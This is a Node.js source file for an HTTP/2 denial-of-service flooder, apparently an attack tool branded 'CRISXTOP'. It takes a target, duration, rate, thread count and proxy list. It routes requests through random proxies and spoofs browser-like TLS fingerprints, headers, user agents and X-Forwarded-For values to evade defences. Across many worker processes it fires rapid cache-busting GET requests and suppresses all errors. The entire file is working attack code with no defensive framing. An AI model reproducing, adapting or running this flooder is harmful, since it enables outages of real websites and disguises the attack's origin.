const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");

const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "application/json, text/plain, */*",
];

const cache_header = ['no-cache', 'no-store', 'must-revalidate'];
const language_header = [
  'en-US,en;q=0.9,ru;q=0.8,kk;q=0.7',
  'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,kk;q=0.6',
  'kk-KZ,kk;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6'
];

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256"
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256"];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions =
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1 |
  crypto.constants.SSL_OP_NO_TLSv1_3 |
  crypto.constants.ALPN_ENABLED |
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
  crypto.constants.SSL_OP_COOKIE_EXCHANGE |
  crypto.constants.SSL_OP_PKCS1_CHECK_1 |
  crypto.constants.SSL_OP_PKCS1_CHECK_2 |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
  console.log(`Usage: host time req thread proxy.txt`);
  process.exit();
}

const secureProtocol = "TLS_method";
const headers = {};

const secureContextOptions = {
  ciphers: ciphers,
  sigalgs: SignalsList,
  honorCipherOrder: true,
  secureOptions: secureOptions,
  secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
var UAs = fs.readFileSync('user-agents.txt', 'utf-8').replace(/\r/g, '').split('\n');
const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
  console.clear()
  console.log(`SENT ATTACK | CRISXTOP`.brightBlue)
  console.log(`--------------------------------------------`.gray)
  
  const restartScript = () => {
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
    setTimeout(() => {
      for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
      }
    }, RESTART_DELAY);
  };

  const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;
    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
      console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
      restartScript();
    }
  };
  
  setInterval(handleRAMUsage, 5000);
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder)
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);
    const connection = net.connect({
      host: options.host,
      port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    
    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });
  }
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Socker = new NetSocket();

function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function getRandomValue(arr) {
  const randomIndex = Math.floor(Math.random() * arr.length);
  return arr[randomIndex];
}

function randstra(length) {
  const characters = "0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

function randstrs(length) {
  const characters = "0123456789";
  const charactersLength = characters.length;
  const randomBytes = crypto.randomBytes(length);
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = randomBytes[i] % charactersLength;
    result += characters.charAt(randomIndex);
  }
  return result;
}

const randstrsValue = randstrs(10);

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
  
  encoding_header = [
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity'
  ];
  
  function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }
  
  function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }
  
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }

  const rateHeaders = [
    {"Accept": accept_header[Math.floor(Math.random() * accept_header.length)]},
    {"Accept-Language": language_header[Math.floor(Math.random() * language_header.length)]},
    {"Origin": "https://" + parsedTarget.host},
    {"X-Forwarded-For": parsedProxy[0]},
    {"DNT": "1"},
    {"TE": "trailers"},
  ];
  
  let headers = {
    ":authority": parsedTarget.host,
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25),
    ":method": "GET",
    "pragma": "no-cache",
    "upgrade-insecure-requests": "1",
    "Accept-Encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
    "Cache-Control": cache_header[Math.floor(Math.random() * cache_header.length)],
    "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
    "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
    "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
    "user-agent": UAs[Math.floor(Math.random() * UAs.length)],
  }
  
  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 10
  };
  
  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return

    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)

    const settings = {
      enablePush: false,
      initialWindowSize: 15564991,
    };

    const tlsOptions = {
      port: parsedPort,
      secure: true,
      ALPNProtocols: ["h2"],
      ciphers: cipper,
      sigalgs: sigalgs,
      requestCert: true,
      socket: connection,
      ecdhCurve: ecdhCurve,
      honorCipherOrder: false,
      rejectUnauthorized: false,
      secureOptions: secureOptions,
      secureContext: secureContext,
      host: parsedTarget.host,
      servername: parsedTarget.host,
      secureProtocol: secureProtocol
    };
    
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      settings: {
        headerTableSize: 65536,
        maxHeaderListSize: 32768,
        initialWindowSize: 15564991,
        maxFrameSize: 16384,
      },
    });
    
    createConnection: () => tlsConn,
    client.settings({
      headerTableSize: 65536,
      maxHeaderListSize: 32768,
      initialWindowSize: 15564991,
      maxFrameSize: 16384,
    });

    client.setMaxListeners(0);
    client.settings(settings);
    
    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          const dynHeaders = {
            ...headers,
            ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
          }
          
          const request = client.request({
            ...dynHeaders,
          }, {
            parent: 0,
            exclusive: true,
            weight: 220,
          })
          .on('response', response => {
            request.close();
            request.destroy();
            return
          });
          request.end();
        }
      }, 300);
    });
    
    client.on("close", () => {
      client.destroy();
      tlsConn.destroy();
      connection.destroy();
      return
    });
    
    client.on("timeout", () => {
      client.destroy();
      connection.destroy();
      return
    });
    
    client.on("error", error => {
      client.destroy();
      connection.destroy();
      return
    });
  });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});